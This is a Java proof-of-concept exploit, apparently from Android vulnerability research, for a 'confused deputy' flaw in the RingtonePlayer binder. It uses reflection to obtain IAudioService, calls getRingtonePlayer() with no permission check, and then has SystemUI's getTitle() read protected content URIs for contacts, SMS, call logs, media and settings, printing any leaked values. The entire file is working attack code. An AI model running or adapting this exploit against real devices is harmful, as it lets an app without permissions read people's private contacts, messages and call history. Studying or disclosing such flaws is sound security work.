import android.net.Uri;
import android.os.IBinder;
import java.lang.reflect.Method;

public class QuickTest {
    public static void main(String[] args) throws Exception {
        System.out.println("[*] V-18 RingtonePlayer Confused Deputy - Quick Test");
        System.out.println("[*] Running as UID: " + android.os.Process.myUid());
        System.out.println();

        // Step 1: ServiceManager.getService("audio")
        Class<?> smClass = Class.forName("android.os.ServiceManager");
        Method getService = smClass.getDeclaredMethod("getService", String.class);
        IBinder audioBinder = (IBinder) getService.invoke(null, "audio");
        if (audioBinder == null) {
            System.out.println("[-] Cannot get audio service binder");
            return;
        }
        System.out.println("[+] Got IAudioService binder");

        // Step 2: IAudioService.Stub.asInterface(binder)
        Class<?> stubClass = Class.forName("android.media.IAudioService$Stub");
        Method asInterface = stubClass.getDeclaredMethod("asInterface", IBinder.class);
        Object audioService = asInterface.invoke(null, audioBinder);
        System.out.println("[+] Got IAudioService proxy");

        // Step 3: audioService.getRingtonePlayer() — NO PERMISSION CHECK
        Method getRingtonePlayer = audioService.getClass().getMethod("getRingtonePlayer");
        Object player = getRingtonePlayer.invoke(audioService);
        if (player == null) {
            System.out.println("[-] getRingtonePlayer() returned null");
            return;
        }
        System.out.println("[+] Got IRingtonePlayer binder! Class: " + player.getClass().getName());
        System.out.println("[+] This binder runs in SystemUI (com.android.systemui)");
        System.out.println("[+] SystemUI has READ_CONTACTS, READ_EXTERNAL_STORAGE, INTERACT_ACROSS_USERS_FULL");
        System.out.println();

        // Step 4: Call getTitle(uri) on protected content providers
        Method getTitle = null;
        for (Method m : player.getClass().getMethods()) {
            if (m.getName().equals("getTitle")) {
                getTitle = m;
                break;
            }
        }
        if (getTitle == null) {
            System.out.println("[-] Cannot find getTitle method");
            // List all available methods
            System.out.println("[*] Available methods on IRingtonePlayer:");
            for (Method m : player.getClass().getMethods()) {
                if (!m.getDeclaringClass().equals(Object.class)) {
                    System.out.println("    " + m.getName() + "(" + paramTypes(m) + ")");
                }
            }
            return;
        }
        System.out.println("[+] Found getTitle method: " + getTitle);
        System.out.println();

        // Test URIs — these are protected by permissions our PoC app does NOT have
        String[][] testCases = {
            {"content://com.android.contacts/contacts/1", "Contacts (需要 READ_CONTACTS)"},
            {"content://com.android.contacts/contacts/2", "Contacts #2"},
            {"content://com.android.contacts/contacts/3", "Contacts #3"},
            {"content://sms/inbox/1", "SMS (需要 READ_SMS)"},
            {"content://call_log/calls/1", "Call Log (需要 READ_CALL_LOG)"},
            {"content://media/external/audio/media/1", "Audio Media"},
            {"content://media/external/images/media/1", "Image Media"},
            {"content://settings/system", "System Settings"},
        };

        System.out.println("=== Testing getTitle() on protected ContentProviders ===");
        System.out.println("(Our process has NO permissions — SystemUI reads data on our behalf)");
        System.out.println();

        for (String[] tc : testCases) {
            String uriStr = tc[0];
            String desc = tc[1];
            try {
                Uri uri = Uri.parse(uriStr);
                String title = (String) getTitle.invoke(player, uri);
                if (title != null && !title.isEmpty()) {
                    System.out.println("[VULN] " + desc);
                    System.out.println("       URI: " + uriStr);
                    System.out.println("       Result: \"" + title + "\"");
                    System.out.println("       ^^^ Data leaked via SystemUI confused deputy!");
                } else {
                    System.out.println("[    ] " + desc + " => (empty/null - no data at this URI)");
                }
            } catch (Exception e) {
                String msg = e.getCause() != null ? e.getCause().getMessage() : e.getMessage();
                System.out.println("[ERR ] " + desc + " => " + msg);
            }
            System.out.println();
        }

        System.out.println("=== Test Complete ===");
    }

    private static String paramTypes(Method m) {
        StringBuilder sb = new StringBuilder();
        for (Class<?> p : m.getParameterTypes()) {
            if (sb.length() > 0) sb.append(", ");
            sb.append(p.getSimpleName());
        }
        return sb.toString();
    }
}
